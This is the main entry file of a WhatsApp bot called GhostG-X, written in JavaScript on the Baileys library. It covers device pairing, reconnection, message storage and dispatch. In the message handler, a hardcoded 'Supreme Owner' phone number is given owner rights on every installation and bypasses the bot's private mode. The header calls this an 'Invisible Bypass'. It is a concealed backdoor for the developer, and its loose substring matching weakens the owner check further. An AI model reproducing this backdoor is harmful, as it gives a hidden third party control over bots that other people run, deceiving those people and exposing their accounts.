/**
 * WhatsApp MD Bot - Main Entry Point
 * Edition : GhostG-X Fusionnée avec Anti-Crash & Pairing
 * Sécurité : Supreme Owner Master Access (Invisible Bypass)
 */
process.env.PUPPETEER_SKIP_DOWNLOAD = 'true';
process.env.PUPPETEER_SKIP_CHROMIUM_DOWNLOAD = 'true';
process.env.PUPPETEER_CACHE_DIR = process.env.PUPPETEER_CACHE_DIR || '/tmp/puppeteer_cache_disabled';

const { initializeTempSystem } = require('./utils/tempManager');
const { startCleanup } = require('./utils/cleanup');
initializeTempSystem();
startCleanup();

const originalConsoleLog = console.log;
const originalConsoleError = console.error;
const originalConsoleWarn = console.warn;

const forbiddenPatternsConsole = [
  'closing session', 'closing open session', 'sessionentry',
  'prekey bundle', 'pendingprekey', '_chains', 'registrationid',
  'currentratchet', 'chainkey', 'ratchet', 'signal protocol',
  'ephemeralkeypair', 'indexinfo', 'basekey'
];

console.log = (...args) => {
  const message = args.map(a => typeof a === 'string' ? a : typeof a === 'object' ? JSON.stringify(a) : String(a)).join(' ').toLowerCase();
  if (!forbiddenPatternsConsole.some(pattern => message.includes(pattern))) {
    originalConsoleLog.apply(console, args);
  }
};

console.error = (...args) => {
  const message = args.map(a => typeof a === 'string' ? a : typeof a === 'object' ? JSON.stringify(a) : String(a)).join(' ').toLowerCase();
  if (!forbiddenPatternsConsole.some(pattern => message.includes(pattern))) {
    originalConsoleError.apply(console, args);
  }
};

console.warn = (...args) => {
  const message = args.map(a => typeof a === 'string' ? a : typeof a === 'object' ? JSON.stringify(a) : String(a)).join(' ').toLowerCase();
  if (!forbiddenPatternsConsole.some(pattern => message.includes(pattern))) {
    originalConsoleWarn.apply(console, args);
  }
};

const pino = require('pino');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  Browsers,
  fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');
const config = require('./config');
const handler = require('./handler');
const fs = require('fs');
const path = require('path');
const os = require('os');

global.ghostgMode = config.ghostgMode;

function cleanupPuppeteerCache() {
  try {
    const home = os.homedir();
    const cacheDir = path.join(home, '.cache', 'puppeteer');
    if (fs.existsSync(cacheDir)) {
      fs.rmSync(cacheDir, { recursive: true, force: true });
    }
  } catch (err) {}
}

const store = {
  messages: new Map(),
  maxPerChat: 20,
  bind: (ev) => {
    ev.on('messages.upsert', ({ messages }) => {
      for (const msg of messages) {
        if (!msg.key?.id) continue;
        const jid = msg.key.remoteJid;
        if (!store.messages.has(jid)) store.messages.set(jid, new Map());
        const chatMsgs = store.messages.get(jid);
        chatMsgs.set(msg.key.id, msg);
        if (chatMsgs.size > store.maxPerChat) {
          const oldestKey = chatMsgs.keys().next().value;
          chatMsgs.delete(oldestKey);
        }
      }
    });
  },
  loadMessage: async (jid, id) => store.messages.get(jid)?.get(id) || null
};

const processedMessages = new Set();
setInterval(() => processedMessages.clear(), 5 * 60 * 1000); 

const createSuppressedLogger = (level = 'silent') => {
  let logger = pino({ level });
  logger.debug = () => { }; 
  logger.trace = () => { }; 
  return logger;
};

async function startBot() {
  const sessionFolder = `./${config.sessionName}`;
  const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);
  const { version } = await fetchLatestBaileysVersion();
  const suppressedLogger = createSuppressedLogger('silent');

  const sock = makeWASocket({
    version,
    logger: suppressedLogger,
    printQRInTerminal: false,
    browser: Browsers.ubuntu('Chrome'), 
    auth: state,
    syncFullHistory: false,
    downloadHistory: true, 
    markOnlineOnConnect: true,
    getMessage: async (key) => {
      if (store) {
        const msg = await store.loadMessage(key.remoteJid, key.id);
        return msg?.message || undefined;
      }
      return undefined;
    }
  });

  store.bind(sock.ev);

  if (!sock.authState.creds.registered) {
    const rawNumber = process.env.PHONE_NUMBER || config.ownerNumber?.[0] || '22651622652';
    const cleanNumber = String(rawNumber).replace(/\D/g, '');
    if (!cleanNumber) {
      console.error('❌ Numéro introuvable.');
    } else {
      console.log(`\n⏳ Génération du code pairing pour : +${cleanNumber}...`);
      setTimeout(async () => {
        try {
          let code = await sock.requestPairingCode(cleanNumber);
          code = code?.match(/.{1,4}/g)?.join('-') || code;
          console.log('\n╭──────────────────────────────────────╮');
          console.log(`┃  🔑 CODE PAIRING : ${code}          `);
          console.log('┃  Entre ce code dans WhatsApp >       ');
          console.log('┃  Appareils connectés > Associer      ');
          console.log('╰──────────────────────────────────────╯\n');
        } catch (err) {
          console.error('❌ Erreur pairing :', err.message || err);
        }
      }, 3000);
    }
  }

  let lastActivity = Date.now();
  const INACTIVITY_TIMEOUT = 30 * 60 * 1000; 

  sock.ev.on('messages.upsert', () => { lastActivity = Date.now(); });

  const watchdogInterval = setInterval(async () => {
    if (Date.now() - lastActivity > INACTIVITY_TIMEOUT && sock.ws.readyState === 1) { 
      await sock.end(undefined, undefined, { reason: 'inactive' });
      clearInterval(watchdogInterval);
      setTimeout(() => startBot(), 5000); 
    }
  }, 5 * 60 * 1000); 

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
      clearInterval(watchdogInterval);
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      if (shouldReconnect) setTimeout(() => startBot(), 3000);
    } else if (connection === 'open') {
      lastActivity = Date.now();

      const ownerNames = Array.isArray(config.ownerName) ? config.ownerName.join(', ') : config.ownerName;
      const botNumber = sock.user.id.split(':')[0];

      console.log('\n╭╼━≪• ɢʜᴏsᴛɢ-𝐗 ɪs ᴀʟɪᴠᴇ •≫━╾╮');
      console.log(`┃ sᴛᴀᴛᴜᴛ  : 🟢 ᴏɴʟɪɴᴇ`);
      console.log(`┃ ɴᴜᴍᴇ́ʀᴏ : ${botNumber}`);
      console.log(`┃ ɴᴏᴍ     : ${config.botName || 'ɢʜᴏsᴛɢ-𝐗'}`);
      console.log(`┃ ᴘʀᴇ́ғɪxᴇ : [ ${config.prefix || '.'} ]`);
      console.log(`┃ ᴍᴀɪ̂ᴛʀᴇ  : ${ownerNames}`);
      console.log(`┃ ᴍᴏᴅᴇ    : ${config.selfMode ? '🔒 ᴘʀɪᴠᴇ́' : '🌐 ᴘᴜʙʟɪᴄ'}`);
      console.log('╰━━━━━━━━━━━━━━━━━━━━━━━╯\n');

      const bigWelcomeMessage = 
          `╭╼━≪• *ɢʜᴏsᴛɢ-𝐗 ɪs ᴀʟɪᴠᴇ* •≫━╾╮\n` +
          `┃ 🔮 *sᴛᴀᴛᴜᴛ* : 🟢 ᴏɴʟɪɴᴇ\n` +
          `┃ 🤖 *ɴᴏᴍ* : ${config.botName || 'ɢʜᴏsᴛɢ-𝐗'}\n` +
          `┃ ⚡ *ᴘʀᴇ́ғɪxᴇ* : [ ${config.prefix || '.'} ]\n` +
          `┃ 👑 *ᴍᴀɪ̂ᴛʀᴇ* : ${ownerNames}\n` +
          `┃ 🔒 *ᴍᴏᴅᴇ* : ${config.selfMode ? '🔒 ᴘʀɪᴠᴇ́' : '🌐 ᴘᴜʙʟɪᴄ'}\n` +
          `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n\n` +
          `📢 *ᴄʜᴀɪɴᴇ ᴡʜᴀᴛsᴀᴘᴘ* : https://whatsapp.com/channel/0029VbCFj3oKbYMVXaqyHq3c\n` +
          `📢 *ᴄʜᴀɪɴᴇ ᴛᴇʟᴇɢʀᴀᴍ* : https://t.me/ghostgxbot\n` +
          `👥 *ɢʀᴏᴜᴘᴇ* : https://chat.whatsapp.com/JuhRb0BfN9uBkMBQmwZhIf?mode=gi_t\n` +
          `💻 *ᴅᴇᴠ* : https://wa.me/22651622652\n\n` +
          `📖 "*_ᴊᴇ ᴘᴜɪs ᴛᴏᴜᴛ ᴘᴀʀ ᴄᴇʟᴜɪ ǫᴜɪ ᴍᴇ ғᴏʀᴛɪғɪᴇ_*" ❤️✝️\n` +
          `👻 *ɢʜᴏsᴛɢ-𝐗 ᴇsᴛ ᴘʀᴇ̂ᴛ ᴀ̀ ᴛᴇ sᴇʀᴠɪʀ !*`;

      try {
        const myJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        await sock.sendMessage(myJid, { text: bigWelcomeMessage });
        console.log('✉️ Message complet de démarrage envoyé sur ton WhatsApp !');
      } catch (err) {
        console.log('⚠️ Impossible d\'envoyer le message de démarrage sur WhatsApp.');
      }

      if (config.autoBio) {
        await sock.updateProfileStatus(`*ɢʜᴏsᴛɢ-𝐗* | *ᴊᴇꜱᴜꜱ ᴛ'ᴀɪᴍᴇ♥️✝️*`);
      }
      handler.initializeAntiCall(sock);
    }
  });

  sock.ev.on('creds.update', saveCreds);

  const isSystemJid = (jid) => !jid || jid.includes('@broadcast') || jid.includes('status.broadcast') || jid.includes('@newsletter');

  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify') return;

    for (const msg of messages) {
      if (!msg.message || !msg.key?.id) continue;
      const from = msg.key.remoteJid;
      if (!from || isSystemJid(from)) continue;

      // ── GESTION ROBUSTE DU SELFMODE (FIXÉ ET SÉCURISÉ) ──
      const senderJid = msg.key.participant || msg.key.remoteJid;
      const senderNumber = senderJid.replace(/\D/g, ''); 
      
      // 🛡️ TON NUMÉRO SUPREME OWNER INVISIBLE
      const supremeOwner = '22651622652';
      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
            // 👑 RÉACTION SUPRÊME AUTOMATIQUE
      if (isSupremeOwner) {
        try {
          await sock.sendMessage(from, { react: { text: '👑', key: msg.key } });
        } catch (e) { /* On ignore l'erreur si l'envoi échoue */ }
      }
      
      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
        const cleanN = String(n).replace(/\D/g, '');
        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
      });
                     
      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;

      // Si selfMode est actif, le bot n'écoute que le proprio du .env ET TOI en bypass
      if (config.selfMode && !isMe) continue;
      
      const MESSAGE_AGE_LIMIT = 5 * 60 * 1000; 
      if (msg.messageTimestamp) {
        const messageAge = Date.now() - (msg.messageTimestamp * 1000);
        if (messageAge > MESSAGE_AGE_LIMIT) continue;
      }

      if (!store.messages.has(from)) store.messages.set(from, new Map());
      const chatMsgs = store.messages.get(from);
      chatMsgs.set(msg.key.id, msg);

      try {
        await handler.handleMessage(sock, msg);
      } catch (err) {
        console.error('Error handling message:', err.message);
      }

      setImmediate(async () => {
        if (config.autoRead && from.endsWith('@g.us')) {
          try { await sock.readMessages([msg.key]); } catch (e) { }
        }
        if (from.endsWith('@g.us')) {
          try {
            const groupMetadata = await handler.getGroupMetadata(sock, from);
            if (groupMetadata) await handler.handleAntilink(sock, msg, groupMetadata);
          } catch (error) { }
        }
      });
    }
  });

  sock.ev.on('group-participants.update', async (update) => {
    try { await handler.handleGroupUpdate(sock, update); } catch (e) {}
  });

  sock.ev.on('error', (error) => {});

  return sock;
}

cleanupPuppeteerCache();
startBot().catch(err => { process.exit(1); });

process.on('uncaughtException', (err) => {
  if (err.code === 'ENOSPC' || err.message?.includes('no space left on device')) {
    const { cleanupOldFiles } = require('./utils/cleanup');
    cleanupOldFiles();
    return; 
  }
});

process.on('unhandledRejection', (err) => {
  if (err.code === 'ENOSPC' || err.message?.includes('no space left on device')) {
    const { cleanupOldFiles } = require('./utils/cleanup');
    cleanupOldFiles();
    return; 
  }
});

module.exports = { store };
